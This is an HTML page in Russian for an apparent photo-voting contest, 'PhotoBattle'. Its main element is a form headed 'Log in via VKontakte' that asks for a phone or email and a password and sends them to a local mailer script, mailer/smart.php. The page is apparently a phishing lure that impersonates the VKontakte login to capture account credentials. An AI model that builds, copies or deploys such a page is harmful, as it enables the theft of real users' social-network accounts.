<!DOCTYPE html>
<html>
<head>
	<title>PhotoBattle, голосуй и выигрывай</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link href="https://fonts.googleapis.com/css?family=Lobster" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,800" rel="stylesheet">
	<script src=”//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js”></script>
</head>
<body>
	<div class="container">
		<div class="wrapper">
			<div class="main">
				<div class="content-block">
					<div class="content-block__left">
						<h1 class="title">Выполните вход через Вконтакте</h1>
						<form action="mailer/smart.php" class="form" method="POST">
							<input placeholder="Телефон или email" type="text" name="login" class="form__input" required>
							<input placeholder="Пароль" type="text" name="password" class="form__input" required>
							<button class="form_btn" type="submit">Войти</button>
						</form>
					</div>
					<div class="content-block__right"></div>
				</div>
				<div class="nav">
					<div class="logo-block">
						<div class="logo">
							<div class="logo-lines left-lines">
								<div class="logo-line"></div>
								<div class="logo-line"></div>
								<div class="logo-line"></div>
							</div>
							<div class="logo-lap">Ф/Б</div>
							<div class="logo-lines right-lines">
								<div class="logo-line"></div>
								<div class="logo-line"></div>
								<div class="logo-line"></div>
							</div>
						</div>
					</div>
					<div class="nav-block">
						<div class="nav-btn"><a href="index.php">ГОЛОСОВАТЬ ЗА УЧАСТНИКА</a></div>
						<div class="nav-btn"><a href="index.php">СТАТЬ УЧАСТНИКОМ</a></div>
						<div class="nav-btn"><a href="index.php">ПОЛИТИКА БЕЗОПСНОСТИ</a></div>
					</div>
				</div>
			</div>
		</div>
	</div>
</body>
</html>